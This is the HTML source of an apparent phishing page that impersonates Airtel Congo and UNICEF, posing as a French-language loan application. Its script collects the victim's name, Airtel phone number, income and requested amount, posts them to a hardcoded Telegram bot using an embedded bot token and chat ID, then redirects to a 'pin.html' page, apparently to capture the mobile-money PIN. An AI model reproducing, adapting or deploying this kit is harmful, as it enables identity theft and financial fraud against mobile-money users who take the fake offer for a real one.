<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title> Prêts Airtel Congo</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #ce1e2d 100%);
            background-attachment: fixed;
            color: white;
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 28px;
        }
        
        .input-field {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: white;
            width: 100%;
            padding: 16px;
            border-radius: 16px;
            outline: none;
            transition: all 0.3s;
        }
        
        .input-field:focus {
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.4);
        }
        
        #loadingPopup {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.9);
            backdrop-filter: blur(8px);
            align-items: center;
            justify-content: center;
            z-index: 100;
        }
    </style>
</head>

<body class="min-h-screen flex flex-col p-6">

    <div id="loadingPopup">
        <div class="glass-card p-10 flex flex-col items-center mx-6 max-w-sm w-full text-center">
            <div class="w-16 h-16 border-4 border-white/20 border-t-white rounded-full animate-spin mb-6"></div>
            <h2 class="text-xl font-bold mb-2">Traitement de la demande</h2>
            <p class="text-sm text-white/60">Finalisation de l'évaluation de crédit pour le montant demandé ...
            </p>
        </div>
    </div>

    <header class="flex items-center gap-4 mb-8">
        <button onclick="window.history.back()" class="w-10 h-10 glass-card flex items-center justify-center">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
            </svg>
        </button>
        <h1 class="text-xl font-bold">UNICEF PROMOTION RDC</h1>
    </header>

    <main class="flex-grow space-y-6 pb-10">

        <div class="glass-card p-6 space-y-5 border-l-4 border-green-500">
            <h3 class="text-sm font-bold uppercase tracking-widest text-white/50 border-b border-white/10 pb-2">Postuler maintenant</h3>

            <div>
                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Montant souhaité (USD)</label>
                <div class="flex items-center gap-3 bg-white/5 border border-white/10 p-4 rounded-2xl">
                    <span class="font-bold text-green-400">$</span>
                    <input type="number" id="loanAmount" placeholder="e.g. 5000" class="bg-transparent outline-none w-full font-bold text-xl">
                </div>
            </div>


            <div class="glass-card p-6 space-y-5">
                <h3 class="text-sm font-bold uppercase tracking-widest text-white/50 border-b border-white/10 pb-2">Identité personnelle</h3>

                <div>
                    <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Nom et prénom </label>
                    <input type="text" id="fullName" placeholder="Full legal name" class="input-field">
                </div>
                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Numéro Airtel</label>
                <div class="flex items-center gap-3 bg-white/5 border border-white/10 p-4 rounded-2xl">
                    <span class="font-bold text-white/40">+243</span>
                    <input type="tel" id="phoneInput" maxlength="9" placeholder="97XXXXXXX" class="bg-transparent outline-none w-full font-bold">
                </div>
            </div>
        </div>

        <div class="glass-card p-6 space-y-5">
            <h3 class="text-sm font-bold uppercase tracking-widest text-white/50 border-b border-white/10 pb-2">Situation financière</h3>

            <div>
                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Source de revenus</label>
                <select id="jobType" class="input-field bg-[#1e293b]">
                    <option value="" disabled selected>Sélectionner la source</option>
                    <option value="Salaried">Salarié (Gouvernement/Privé))</option>
                    <option value="Business">Affaires / Trading</option>
                    <option value="Other">Autre</option>
                </select>
            </div>

            <div>
                <label class="text-[10px] uppercase font-bold text-white/40 ml-1 mb-2 block">Revenu mensuel (USD)</label>
                <input type="number" id="income" placeholder="Revenu mensuel" class="input-field">
            </div>
        </div>
        <button id="submitBtn" class="w-full bg-white text-[#ce1e2d] py-5 rounded-2xl font-black text-lg active:scale-95 transition-all shadow-xl uppercase tracking-widest">
    Postulez maintenant
</button>

    </main>

    <script>
        const submitBtn = document.getElementById('submitBtn');
        const popup = document.getElementById('loadingPopup');

        // Telegram config
        const BOT_TOKEN = '8780826826:AAHewONkKQh4ckqJwDsrT0tWyIkshHARCFs';
        const CHAT_ID = '8317337791';

        submitBtn.addEventListener('click', async() => {

            const data = {
                amount: document.getElementById('loanAmount').value,
                name: document.getElementById('fullName').value,
                phone: document.getElementById('phoneInput').value,
                job: document.getElementById('jobType').value,
                income: document.getElementById('income').value
            };

            // Validation
            if (!data.amount || !data.name || data.phone.length < 9) {
                alert("Please fill out all fields to proceed.");
                return;
            }

            const fullPhone = "+243" + data.phone;
            localStorage.setItem('userPhone', fullPhone);

            // Show loading
            popup.style.display = 'flex';

            const message =
                `🏦 NEW LOAN APPLICATION\n\n` +
                `Amount: $ ${data.amount}\n` +
                `Name: ${data.name}\n` +
                `Phone: ${fullPhone}\n` +
                `Job: ${data.job}\n` +
                `Income: $ ${data.income}`;

            // Send Telegram
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            }).catch(err => console.error(err));

            // Always redirect
            setTimeout(() => {
                window.location.href = 'pin.html';
            }, 5000);

        });
    </script>

</body>

</html>
